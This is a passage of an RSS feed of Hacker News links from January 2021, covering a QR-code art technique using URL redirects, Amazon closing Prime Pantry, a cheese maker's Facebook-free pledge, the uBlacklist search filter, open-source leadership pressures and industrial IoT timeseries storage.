<p>We can add our timestamp policy to the builder:</p>
<p><code>.withTimestampPolicyFactory(new SearchQueryTimestampPolicyFactory())</code></p>
<h2>Hacking Time!</h2>
<p>Beam is about hacking time, I hope you’ve appreciated this walkthrough of some of Beam’s capabilities. If you’re interested in joining me on building Shopify’s future in search and discovery, please check out these great job postings!</p>
<p>Doug Turnbull is a Sr. Staff Engineer in Search Relevance at Shopify. He is known for writing the book “Relevant Search”, contributing to “AI Powered Search”, and creating relevance tooling for Solr and Elasticsearch like Splainer, Quepid, and the Elasticsearch Learning to Rank plugin. Doug’s team at Shopify helps Merchants make their products and brands more discoverable. If you’d like to work with Doug, send him a Tweet at <a href="https://twitter.com/softwaredoug" target="_blank" title="Doug Turnbull on Twitter" rel="nofollow noopener noreferrer">@softwaredoug</a>!</p>
</div></div>]]>
            </description>
            <link>https://shopify.engineering/apache-beam-for-search-getting-started-by-hacking-time</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686936</guid>
            <pubDate>Fri, 08 Jan 2021 17:13:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Draw a Valid QR Code]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25686728">thread link</a>) | @thricegr8
<br/>
January 8, 2021 | https://marienraat.nl/hacking-qr-codes.html | <a href="https://web.archive.org/web/*/https://marienraat.nl/hacking-qr-codes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
      <div>
        <div>
          <p><b>Check out <a href="https://my-qr.art/">My-QR.art</a> for the final result!</b></p>

          <p>QR codes provide a clear and approachable way of translating the physical world to the
          digital world. When I see a QR code, I always want to scan it to find out what is behind
          it, somehow they always fascinate me. But QR codes always look very similar, could there
          be a way to make them look more cool? Make them a certain specific shape or contain pixel
          art?</p>

          <p>People already (ab)use the error correction build into QR codes to embed their logo
          in it, they simply put their logo over a part of the QR code and let the error correction
          handle the missing data. However, you can never obscure more than 30% of the code (and
          usually a lot less) if you choose this approach. But QR codes are mostly a visualisation
          of data. Can we approach the problem from the other side? What if we don't try to
          design a QR code to fit the data, but fit the data to the design of the QR code that we
          want.</p>

          <p>Spoiler, we can. Check out <a href="https://my-qr.art/">My-QR.art</a>. All the code is
          totally free and open source, so feel free to
          contribute <a href="https://github.com/raatmarien/my-qr.art">on GitHub</a></p>

          <h2 id="the-idea">The idea</h2>

          <p>Say, we want to promote our website. And we have a nice grayscale logo. Now we want to
          have an engaging QR code that looks like our logo.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/my-qr.art-logo.svg" alt="My-QR.art logo"></p><p>And we have an URL that we want the QR code to lead us too, for
            example: <a href="https://my-qr.art/">https://my-qr.art</a>.</p>
          
          <p>We set up a web server that can redirect certain URLs to other URLs. Then we can make
          the beginning of the data of our QR code the URL to that web-server and the rest of the
          QR's data can be anything. So we can choose the rest of the data in any way that makes
          our QR code look most like our design!</p>

          <p>For example the QR code could send you
            to <code>https://my-qr.art/r/arbitrary-super-long-string</code>. On the back-end we tell
            the server to redirect any request with the
            URL <code>https://my-qr.art/r/arbitrary-super-long-string</code>
            to <code>https://my-qr.art</code>. And tada! We have a functional QR code that sends us to
            the address we want, while having way more control over how the QR code looks! Up to 80%
            of the code can be freely designed this way!</p>

          <p>When we have this all working, we could even make nice scannable QR gifs. We could make
          each frame separately and let them all redirect to the same page. I admit, most QR codes
          are printed, so gifs might not make the most sense, but they look pretty cool! To keep you
          excited for the rest of the article, here is world's first ever working QR gif (as far
          as I know)!</p>
          
          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr.gif" alt="Animated QR code that shows a running horse"></p><p><a href="https://en.wikipedia.org/wiki/The_Horse_in_Motion">The running horse might
          remind you of some other movie...</a></p>

          <h2 id="qr-codes">How does QR work?</h2>

          <p>Now that we know the concept, lets get started. First we need to know how QR codes
          actually work.</p>

          <p>QR codes encode data by making some blocks dark and other light. The QR scanner can
          then read which are dark and which are light and reconstruct the original data. QR codes
          can have 40 different sizes, from <em>version 1</em> (very small, 17x17) to <em>version
          40</em> (very big, 177x177). QR codes are made of black and white 'modules' and
          each module has one of the following 4 functions:</p>

          <ol>
            <li>Help the scanner recognise and orient the QR code</li>
            <li>Give information about the QR code size, type and other internal QR stuff</li>
            <li>Encode the actual data that the QR code represents</li>
            <li>Encode error correction info about the QR code</li>
          </ol>

          <h2 id="drawing">Creating a template</h2>

          <p>Our plan is to allow the user to choose the colour of any module that has function 3. So
          the first step is to let the user know which pixels they can control and which pixels they
          can't control for the QR code size they chose. For now lets try to create an image on
          which the modules with function 3 are coloured white and all other modules are coloured
          grey.</p>

          <p>For this we can colour all the modules and error data. To get this right you really need
          to dive into how QR codes work. We need to think about the data encoding, interleaving,
          extra eyes, error words and more. We'll also need to take into account that we'll
          need to reserve first few characters of our data for the start of our URL. Luckily there
          is a great source on QR codes on the
          internet, <a href="https://www.thonky.com/qr-code-tutorial/introduction">the QR code
          tutorial from Thonky.com</a>. Putting the work in, we get something like this, for version
          30.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-template.png" alt="A template for a QR design"></p><h2 id="reading">Reading a design</h2>

          <p>Now let's work on the other side of the puzzle, when we have a design that a user
          has drawn on our template, how do we convert it to a working QR code? QR codes have 4
          possible types of encoding: <em>numeric</em>, <em>alphanumeric</em>, <em>binary</em>
          and <em>kanji</em>. We need something that we can create valid URLs with, so numeric and
          kanji are out. Secondly, we need the random string at the end of our URL to
          be <em>normal</em> enough so that QR scanners will still recognise our code as an
          URL. The <em>binary</em> encoding will create characters that aren't ordinarily found
          in URLs ('\0' for example), which means lots of QR scanners won't let their
          users open our URL. Luckily the <em>alphanumeric</em> encoding has just enough characters
          to let us make valid URLs (although they'll have to be all caps).</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-design.png" alt="A design for a QR code that contains the My-QR.art logo">

          <img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-data-order.png" title="Made by Thonky, shared under the CC ANC 4.0" alt="An illustration from Thonky.com that shows how data is encoded in a QR code"></p><p>So with that figured out, lets read that design the user made. First we'll extract
          a bit string from all the data modules in the design. For small QR codes this is quite
          straight forward, the QR code is simply read from right to left, bottom to top and back
          again in double columns, see the illustration from Thonky above. However, when the QR code
          size passes 5, we'll have to take into account interleaving. Then the data words are
          scattered around the QR code, presumably to make the data pattern more random. So
          we'll have to reverse that interleaving procedure. Luckily how it works is explained
          by <a href="https://www.thonky.com/qr-code-tutorial/error-correction-coding">Thonky.com</a>. At
          last we get a bit string from our design, here we only show the first 80 character, the
          real bit string for this design is 13863 bits long.</p>
          <p><code>01100011010101001100101010001100011110111010100000000001110100111110011101001001</code></p>

          <h3 id="decoding">Decoding the bitstring</h3>
          <p>Now we'll need to decode the bits to an alphanumeric string. Here we group 11 bits
          together every time and then convert that into two alphanumeric characters
          using <a href="https://www.thonky.com/qr-code-tutorial/alphanumeric-table">this
          table</a>. We get the following data string (again truncated).</p>

          <p><code>KS$#LKAHRDF9H8XQI9AL HRD$OIWHSRE94QX95IFR*IK9HF/ 5NM+/AMIA99LB I5R II98ULR JRD/AR1 IRG8...</code></p>

          <p>We'll just replace the first 20 characters with our URL prefix and we get:</p>

          <p><code>HTTPS://MY-QR.ART/R/ HRD$OIWHSRE94QX95IFR*IK9HF/ 5NM+/AMIA99LB I5R II98ULR JRD/AR1 IRG8...</code></p>

          <h3 id="qr-code">Generating the QR code</h3>

          <p>Now we can use any QR library to create the QR code! The QR library will handle adding
          all the difficult error codes and other boring stuff for us.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/failed-qr.png" alt="A random looking QR code"></p><p>But what is that? Why does it still look all random? The problem is masking. The QR
          code spec includes 5 different masks and the mask that makes the QR code look most random
          is chosen, which is almost certainly not our design. This is done to make the code easier
          to read for scanners. However, in my experience, QR codes scan just fine with more
          structured data. So we don't have to feel too bad about modifying our QR library to
          always use the same mask. Then after we apply the same mask to our design before
          processing it, we finally get the desired image.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/my-qr.art-qr.png" alt="A QR code with the design in it"></p><h2 id="redirecting">Redirecting the request</h2>

          <p>Now to redirect the QR code to the right domain. This should be easy, put the QR URL in
          a database and link it to the redirect URL. When we receive a request, simply look up the
          corresponding URL in a database. However, if we want to use a modern web server, we'll
          have to jump through some hoops... Apache doesn't like most of our URLs, since they
          are technically malformed (ugh, spoil the fun much Apache?). So it throws an <em>Error
          400: Bad request</em>. We can't disable this error anywhere it seems. However, luckily
          there is a workaround, we can set a custom error page for our <em>Error 400</em>, so if we
          just set the redirect page as the error page for <em>Error 400</em>, we are home free!
          Luckily Apache is not so much of a spoilsport that it throws a Bad Request error while
          trying to handle a Bad Request...</p>

          <p>For the back-end I've been using Django, and it has another fun bug that shows up
          with these really weird URLs. It tries to decode the URL as an ISO-8859-1 string, but some
          of the characters passed by Apache aren't in ISO-8859-1. So we have to derive our own
          WSGI handler to workaround
          this, <a href="https://github.com/raatmarien/my-qr.art/blob/main/my_qr_art/custom_wsgi.py">see
          here</a>. But now it works, try to scan the QR we made, it redirects where we want it to
            redirect!</p>

          <p>One small caveat though, QR codes themselves are standardized and we create standard
          compliant QR codes with correct URLs in them, but QR scanners aren't standardized and some
          might not recognize our code as a URL and will see it as plain text instead.</p>

          <h2 id="a-web-app">Custom QR codes for everyone!</h2>

          <p>Just outputting and parsing images isn't very user friendly, so I made a nice web
          app at <a href="https://my-qr.art/">My-QR.art</a> using Django. It
          has <a href="https://my-qr.art/editor">a friendly editor</a> where you can draw, fill or
          upload black and white images to make your QR code. It also has some …</p></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://marienraat.nl/hacking-qr-codes.html">https://marienraat.nl/hacking-qr-codes.html</a></em></p>]]>
            </description>
            <link>https://marienraat.nl/hacking-qr-codes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686728</guid>
            <pubDate>Fri, 08 Jan 2021 16:59:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon Shutters Prime Pantry]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25686448">thread link</a>) | @prostoalex
<br/>
January 8, 2021 | https://www.bnnbloomberg.ca/amazon-shutters-prime-pantry-an-early-online-grocery-initiative-1.1545336 | <a href="https://web.archive.org/web/*/https://www.bnnbloomberg.ca/amazon-shutters-prime-pantry-an-early-online-grocery-initiative-1.1545336">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Amazon.com Inc. has shuttered Prime Pantry, a grocery and household essentials delivery service that was one of the retailerâ€™s early forays into selling food online.</p>

<p>The program closed on Wednesday, an Amazon spokeswoman said, and thousands of products previously available under the Prime Pantry banner were folded into the companyâ€™s main retail site.</p>

<p>Launched in 2014, Prime Pantry featured a selection of shelf-stable food and snacks, as well as cleaning products, and was designed to get shoppers to stock up on the bulky, often expensive-to-ship products in orders that could fit into a single large box.</p>

<p>Initially the service was offered only to members of the Prime free shipping program, but Amazon added a US$5 a month subscription option in 2018. Those who were still paying the monthly fee were notified of the shutdown in December and received refunds, the spokeswoman said.</p>

<p>â€œAs part of our commitment to delivering the best possible customer experience, we have decided to transfer Amazon Pantry selection to the main Amazon.com store so customers can get everyday household products faster, without an extra subscription or purchase requirement,â€� the spokeswoman said in an email.</p>

<p>In addition to shelf-stable food offered on Amazonâ€™s main retail site, members of the $119-a-year Prime program in many cities can also order fresh food from Amazon Fresh and the companyâ€™s Whole Foods Market chain.</p>
</div></div>]]>
            </description>
            <link>https://www.bnnbloomberg.ca/amazon-shutters-prime-pantry-an-early-online-grocery-initiative-1.1545336</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686448</guid>
            <pubDate>Fri, 08 Jan 2021 16:39:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yeti Foods is a Facebook-Free business]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25686437">thread link</a>) | @shafyy
<br/>
January 8, 2021 | https://blog.yeticheese.com/yeti-is-a-facebook-free-business/ | <a href="https://web.archive.org/web/*/https://blog.yeticheese.com/yeti-is-a-facebook-free-business/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Yeti will not use any of Facebook's products from today onwards.</p><p>Why?</p><p>Facebook controls some of the most used apps such as WhatsApp, Instagram, Messenger, and of course, Facebook. They have shown time over time that they don't care about their users' privacy and are willing to do anything to maximize their stronghold and power.</p><p>It's clear that consumers and society always lose when one company becomes too big. That's why there are monopoly and anti-trust laws that try to prevent and regulate such cases.</p><p>Tech companies such as Facebook and Google have new business models and therefore have managed to evade those laws. Luckily, this is changing, as governments are introducing more laws that aim at breaking up and regulating these companies to protect consumers.</p><p>But we can't only rely on our governments to take action. Every single consumer's decisions also matter. If enough people stop using Facebook's products, their power will diminish.</p><p>This is easier said than done, because these products have network effects. That means that the value of the product to the user increases exponentially for every additional user. For example, you wouldn't use WhatsApp if none of your friends were on it. At the same time, it's much harder for you to switch to a different messaging app like Signal because you need to convince all your friends to join, too.</p><p>It's hard but not impossible.</p><p>From today onwards, we pledge that Yeti will not use any products by Facebook. As stated in <a href="https://m.signalvnoise.com/become-a-facebook-free-business/">Basecamp's blog post</a>, which inspired our decision, this means:</p><ol><li>We do not buy advertisement on Facebook, Messenger, Instagram, or WhatsApp.</li><li>We do not use Facebook, Messenger, Instagram, or WhatsApp to promote or represent our business or to communicate with our customers.</li><li>We do not assist Facebook in its data collection regime through use of Facebook social Like buttons or by offering Facebook logins.</li></ol><p>This was not an easy decision. For example, Instagram and Facebook are important platform for us to stay in touch with current and prospective consumers. It's clear that by taking this decision, we will lose customers and money. However, it is the right thing to do and this is something that's more important than financial success.</p><p>As a customer, you can be assured that none of the money you spend with us goes to Facebook.</p><p>Now, go and <a href="https://yeticheese.com/product/yeti-no-1">buy our cheese</a> so we can make up for the lost revenue 😝</p>
			</section></div>]]>
            </description>
            <link>https://blog.yeticheese.com/yeti-is-a-facebook-free-business/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686437</guid>
            <pubDate>Fri, 08 Jan 2021 16:38:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UBlacklist is a Google Search filter]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25686308">thread link</a>) | @URfejk
<br/>
January 8, 2021 | https://iorate.github.io/ublacklist/ | <a href="https://web.archive.org/web/*/https://iorate.github.io/ublacklist/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="uBlacklist">
    
    
    

    <div>
      
        <header>
          
          


        </header>
      

      <section itemprop="text">
        
          
        
        <p>uBlacklist is a Google Search filter for Chrome and Firefox.</p>

<p><a href="https://chrome.google.com/webstore/detail/ublacklist/pncfbmialoiaghdehhbnbhkkgmjanfhe/">Chrome Web Store</a> / <a href="https://addons.mozilla.org/en/firefox/addon/ublacklist/">Firefox Add-ons</a> / <a href="https://github.com/iorate/ublacklist">GitHub</a></p>

<h2 id="demo">Demo</h2>

<p><img src="https://iorate.github.io/assets/images/ublacklist/demo.gif" alt="demo"></p>

<h2 id="features">Features</h2>

<ul>
  <li>Prevent blocked sites from appearing even in a moment</li>
  <li>Block sites flexibly using match patterns and regular expressions</li>
  <li>Support Bing, DuckDuckGo, Ecosia (partially) and Startpage.com</li>
  <li>Synchronize blacklists among devices using Google Drive or Dropbox</li>
  <li>Subscribe to public blacklists</li>
  <li><del>Support Firefox for Android (without synchronization)</del> not available in Firefox for Android 79 or later</li>
</ul>

<h2 id="links">Links</h2>

<ul>
  <li><a href="https://iorate.github.io/ublacklist/getting-started">Getting Started</a></li>
  <li><a href="https://iorate.github.io/ublacklist/advanced-features">Advanced Features</a></li>
  <li><a href="https://qiita.com/iorate/items/9ff65360fbdf4082476a">Personal Blocklist の代替になりそうな Chrome 拡張機能を作ってみた</a> (Japanese tutorial)</li>
</ul>

        
      </section>

      

      

      
    </div>

    
  </article>

  
  
</div>

    </div></div>]]>
            </description>
            <link>https://iorate.github.io/ublacklist/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686308</guid>
            <pubDate>Fri, 08 Jan 2021 16:28:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Five Pressures of Leadership in OSS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25685688">thread link</a>) | @alexellisuk
<br/>
January 8, 2021 | https://blog.alexellis.io/the-5-pressures-of-leadership/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/the-5-pressures-of-leadership/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><p>In this post I want to introduce the reader to five pressures that I have encountered over the past five years of building, leading, and maintaining Open Source Software (OSS) with community. This essay is primarily about being a leader in Open Source, but I believe <a href="https://www.amazon.co.uk/How-Survive-Thrive-Church-Leader/dp/1854247611">it applies outside of technology</a> too.</p>
<blockquote>
<p>My aim is to foster understanding and empathy between contributors, community members, users, and maintainers. I would also like for maintainers and leaders in Open Source to feel a sense of solidarity in their shared burden.</p>
</blockquote>
<p>It is often said that Open Source Software is not sustainable, because it has no inherent business model, but I believe there are other pressures that leaders experience which when left unchecked may lead to "burn-out".</p>
<p>I'll briefly describe what I believe leadership means before introducing each of the pressures and how they may be experienced. It's my opinion that the examples apply beyond Open Source Software and the technology industry. I will then sum up the pressures and make a case for sustainable leadership.</p>
<p>As a disclaimer, I've generalised my experience and what I've shared here. I am not referring to any one person, even if you can identify with what I'm saying.</p>
<h2 id="whatisleadership">What is leadership?</h2>
<p>The Oxford English Dictionary defines leadership as a noun:</p>
<ul>
<li>
<p>the action of leading a group of people or an organization.</p>
<p>Synonymns: guidance, direction, authority, control, management, superintendence, supervision; organization, government, orchestration, initiative, influence</p>
</li>
<li>
<p>the state or position of being a leader.</p>
<p>Synonymns: headship, directorship, direction, governorship, governance, administration, jurisdiction, captaincy, superintendency, control, ascendancy, rule, command, power, mastery, domination, dominion, premiership, sovereignty</p>
</li>
</ul>
<p>It is clear from the sheer amount of synonymns for the term, that the word itself can have many meanings and nauances. I would also suggest that the our own experiences and culture may project specific expectations and connotations.</p>
<p>For some Open Source maintainers, leadership may start unintentionally. A developer may become inspired to build an idea into a project and by default is the director and administrator. All of the control rests with them and at this stage the project is likely to be classed as be a Proof of Concept (PoC), an experiment or a "side-project." Other people are unlikely to be involved, but that may change quickly. The maintainer is the de factor leader in their team of one.</p>
<p>Some projects remain in this state, but others may draw in users and contributors who in turn volunteer their time, ideas, and energy to advance the project. The maintainer must now set a direction, communicate it, and begin to decide how to govern the project. For me mirroring the style of other maintainers and leaders I knew helped significantly. In my experience these skills can be learned "on the job", but it's easy to get things wrong.</p>
<p>In most companies there are two tracks for a career - either as an individual contributor or as a people-manager. Individual Contributors tend to be builders of things and have very technical work. They may also lead a team or hold responsibility depending on their level of seniority. <a href="https://www.amazon.co.uk/Managing-Humans-Humorous-Software-Engineering/dp/1430243147">People managers have a very different set of skills</a> and deliver results for the business through delegation and by constantly communicating across teams.</p>
<p>In a corporation you are likely to have a very clearly defined role and hierarchy to fall into, but as an Open Source leader and maintainer your work will be a mixture of the two tracks.</p>
<p>This is an apt time to introduce the first pressure: unclear boundaries.</p>
<h2 id="1unclearboundaries">1. Unclear boundaries</h2>
<p>What is your role? What does it say on LinkedIn, and on your business cards? Does that differ from what you actually do on a day to day basis? Do you work 1 in 3 weekends? Are you on rotation for on-call duties? Do you have reports?</p>
<p>As a leader of a community and an Open Source project, there is no job description and there are no set hours. One of the synomymns for leadership is governance, and that can cover how you and the project operate. I started to define a model for governance with a "Contributing Guide" which explains the process for raising an issue or requesting a change.</p>
<p>People who come to the project now look to me and the other primary contributors to operate within that governance model and for that reason it is important to do so. Some may not be aware of the processes and some even chose to ignore them. I believe that leaders need to be flexible, but if they say one thing and to do another continually, then it sets a confusing example for others to follow.</p>
<p>When I began I enjoyed the interest in my projects from users and contributors from all around the world. People would contact me at all hours of the day and night and I wanted to reply to every notification and email within minutes, if I could. I quickly found that I wouldn't be able to keep that up.</p>
<p>Having no clear hours means that unless you are careful, that you are actually on-call 27/4, 365 days, even when you're on vacation.</p>
<p>If left unchecked then unclear boundaries can lead to an intermingling of the leader's self with the project and team. I believe that this is understandable given the investment and stake the leader has, but gaining validation and self-worth through the success or failure, growth rate or decline of something outside of their control is a recipe for burning out.</p>
<p>Rather than being able to celebrate past achivements, the leader may start to feel pressure to grow the project to compete with similar product offerings. Those products may be built by companies with well-staffed teams and 7-figure budget, so it is not unly unatainable, but unfair.</p>
<p>The pressure of unclear boundaries means that users and other contributors may bring unreasonable expectations to your door and you may feel obliged to do what is asked of you.</p>
<h2 id="2pay">2. Pay</h2>
<p>Whilst the curve for leadership positions within a corporation inflects up steeply, this is simply a different matter in Open Source and those involved in other types of public service.</p>
<p>In my opinion there is no clear business model for Open Source Software, which means there is also no reason for someone to pay me for maintaining or building that software. A friend recently explained this to me in terms of "value capture", which I found immensely useful.</p>
<p>OSS allows companies and other OSS projects to stand on the tall shoulders of those that came before, and to either enhance or to put a new spin on prior work. That means capturing and amplifying existing value for something new.</p>
<p>In the same way that I cannot and will not be able to afford to pay the Golang development team for their many years of efforts that I leverage in my work. It seems equally unlikely that an end-user company will be able to pay me for the value I have created for them, that they capture and amplified in their business.</p>
<blockquote>
<p>It is liberating to remove the unrealistic and unreasonable expectation that end-user companies should pay us for our work.</p>
</blockquote>
<p>Given that maintaining and building features for OSS can take a significant amount of time, this leaves maintainers with only a few options. Such as the following:</p>
<ul>
<li>Work full-time for a company, and overtime for the OSS project in your evenings and weekends</li>
<li>Work part-time consulting through your own company, and part-time without pay for your OSS project</li>
<li>Find a co-founder, seek out investment, and build a commercial product from the project</li>
<li>Don't earn a salary at all, and work for full-time without pay on the OSS project</li>
<li>Close the OSS project, or pass the mantle on to someone else</li>
</ul>
<p>There are some exceptions where developers are recruited and paid to work on Open Source projects for a variety of reasons. This is much different than a maintainer being hired specifically to maintain and build the project they lead.</p>
<p>You will also note that I did not include <a href="https://github.com/users/alexellis/sponsorship">"sponsorship" as an option</a>, this is because in my experience sponsorship is a hard sell and difficult to do meaningfully. I currently view sponsorship as a top-up mechanism to part-time consulting, rather than as a means to an end.</p>
<p>Whichever option a maintainer picks, there will always be a significant amount of money left on the table. This is a pressure that can build over time, especially when compared to peers working for a company.</p>
<h2 id="3workingwithvolunteers">3. Working with volunteers</h2>
<p>Has anyone ever asked you to do them a favour?</p>
<p>It may be something as simple as getting a latte for a colleague on your coffee run, helping your neighbour move house, giving your wife a lift to work because her car is in at the mechanic's, reaching into your pocket to give change to someone on the street, going bowling for a work outing, or even setting up a new printer for a relative.</p>
<p>How did you feel about the ask? "It depends" you say. It depends on the relationship, how much it inconveniences you, and what you may get back in return. I know that if it's my turn to buy dinner, next time I meet my friend, he will be paying.</p>
<p>With the example of taking my wife to work, it's highly unlikely that I'd flake. I can't think of anything I'd rather do less than setting up a relative's printer and I would easily change my mind about the work bowling trip.</p>
<p>I believe that when leading an Open Source project or a community, that volunteers are essential to its success. As a maintainer, your pay is already below par and funding is unlikely to be bountiful. So relying on goodwill, favours, and external contributions become ever more important as the project grows. Not to mention that to grow and extend the impact of your project, you will need to delegate responsibility and duties to other people.</p>
<p>Other leaders will be quick to tell you to "just delegate". In my experience delegation is key to growing a community and for motivating others to act not only in their own interest, but for the common good.</p>
<p>If a maintainer starts a project on their own, then it may be hard …</p></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.alexellis.io/the-5-pressures-of-leadership/">https://blog.alexellis.io/the-5-pressures-of-leadership/</a></em></p>]]>
            </description>
            <link>https://blog.alexellis.io/the-5-pressures-of-leadership/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25685688</guid>
            <pubDate>Fri, 08 Jan 2021 15:35:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Large scale Industrial IoT data project: lessons learned in 2020]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25685491">thread link</a>) | @stingraycharles
<br/>
January 8, 2021 | https://blog.quasardb.net/large-scale-industrial-iot-data-project-lessons-learned-in-2020 | <a href="https://web.archive.org/web/*/https://blog.quasardb.net/large-scale-industrial-iot-data-project-lessons-learned-in-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_151456960811572" data-hs-cos-general-type="widget" data-hs-cos-type="module">
    <div>
<div>

<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><h2>Introduction</h2>
<p>Industrial Internet of Things (IIoT) is facing the new challenge of having to ingest very high volume of timeseries data <strong><em>and</em></strong> perform complex analysis in real time.</p>
<!--more-->
<p>Doing one of the two is hard, the two at the same time is extremely challenging. In other words, you want to have your cake, eat it, own the bakery, and paying yourself massive dividends every year.</p>
<p>Quasardb was built on the vision where we can make the world more efficient if we instrument everything, at the highest possible resolution, and use that data to make decisions. This is applying the logic of a quantitative hedge fund (who happen to be another big vertical for us) to the industrial world.</p>
<p>The first part of the plan was to build the database engine capable of processing the new volume of data while delivering complex analytics.</p>
<p>In 2020, we have started phase two of our plan where we integrate the database in the industrial apparatus.</p>
<p>This blog post is about the lessons we’ve learned along the way.</p>
<h2>Timeseries in Industrial IoT</h2>
<h3>Monitoring</h3>
<p>When you build monitoring for your industrial application, you can get away with one point per second (and sometimes even less) per sensor. Even if you have hundreds of thousands of sensors, that's still less than a million points per second, often below a megabyte per second of new data.</p>
<p>Additionally, monitoring rarely requiress a high-resolution history, meaning that you can reduce the resolution to one point per minute (or even less), making it possible to fit a multi-year history in less than a gigabyte.</p>
<p>That's because if you're interested in "when a failure happened," you don't need to know at the microsecond.</p>
<h3>Predictive maintenance</h3>
<p>Monitoring is a must, but monitoring is reacting when you should be anticipating. What you want to do is to know when a problem will happen before it happens: that's predictive maintenance. To do that, you build models on finely grained data. Once your model is ready, you then inject all that raw data in real-time and process alerts.</p>
<p>How does it work? You're looking for something called "weak signals." A weak signal can be, for example, a specific spike of electric consumption, which in itself isn't a problem, but, after analyzing years of historical data, you know this spike (or series of spikes) is heavily correlated, with, for example, a turbine failure.</p>
<p>The higher the resolution, the better because the difference between a non-event and the prelude to a problem can be very subtle. It is as if you were trying to make sense of a green spot on a low-resolution picture. Is it a tree, an animal, a person?</p>
<h2>Another class of problem</h2>
<p>Old-school monitoring applications don't impose a particular challenge on databases unless you are at an enormous scale. When you have data with second-granularity, a case could be made that you maybe don't even need a timeseries database, except for convenience, efficiency, or because you're doing specific queries that TSDBs are very good at (such as ASOF joins).</p>
<p>However, serious predictive maintenance is another story. Sensors typically sample at 2-4 kHz, which means you have 2,000 to 4,000 times more data than before. Some customers are even beyond 20 kHz, that is 20,000 times more data than second-granularity!</p>
<p>Gigabytes become terabytes; terabytes become petabytes.</p>
<p>You could downsample. But will you make up what the green spot on the image is?</p>
<p>As an example, we'll focus on electrical waveform data to discuss the specific challenges of doing data science on the full raw stream of data.</p>
<h2>What do we mean by electrical waveform data?</h2>
<p>Electrical waveform data represents the variation of electricity amperage (I) and voltage (U) over time.</p>
<p>If you see electricity as a stream of water, amperage is the strength of the current, and voltage is the difference in height between two points.</p>
<p>The electricity you have at home is called two-wire single-phase electric power, with a third conductor called the ground to prevent electric shock. The current alternates, meaning the voltage varies over time at a fixed frequency (usually 50 Hz or 60 Hz). If you wanted to monitor an electric outlet at home, you would thus have two values at any point in time.</p>
<p>However, in industrial applications, <a href="https://en.wikipedia.org/wiki/Three-phase_electric_power" rel="noopener" target="_blank">three-wire three-phase electric power</a> is the norm, mostly because it enables you to transmit the same amount of electrical power with less conductor material. This means that for every point, you don't have just two values (I and U), but six (I1, U1, I2, U2, I3, U3). Oops! Suddenly, three times more data!</p>
<h2>A problem of scale</h2>
<p>But, wait, there's more!</p>
<p>We have observed that data within machinery is often sampled between 1 kHz and 5 kHz; you can represent each point using fixed-point notation or floating-point notation data. The sensor's bit depth is usually around 16-bit, meaning a double-precision floating-point (64-bit) will have no loss of precision, and floating-point is often easier to work with for data scientists.</p>
<p>If you include a nanosecond precise timestamp, every sample is 6 floating-point values and 1 high-resolution timestamp. Because life is never simple, every sample comes with labels in strings embedding necessary metadata. No, you can't get rid of the labels, unless you really want the data science team to be unhappy!</p>
<p>Long stories short, you quickly end up with <strong>tens, if not hundreds, of megabytes of</strong> <strong>raw data</strong> <strong>per second</strong> to store in your database.</p>
<h2>How did our users solve the problem?</h2>
<p>Prior to using QuasarDB, customers would typically use one of the following approaches:</p>
<ul>
<li>Give up and working on raw data and downsample it until it fits in the system.</li>
<li>Store the waveform data in blocks of x seconds in blob storage and resort to convoluted scripts to inject that data into data science tools. This can record the data at the required speed, but at the cost at very high querying complexity (and forget about those fancy <a href="https://doc.quasardb.net/master/queries/select.html" rel="noopener">ASOF joins</a>!). It can also create impedance problems with the data science tools that need to load more data than required.</li>
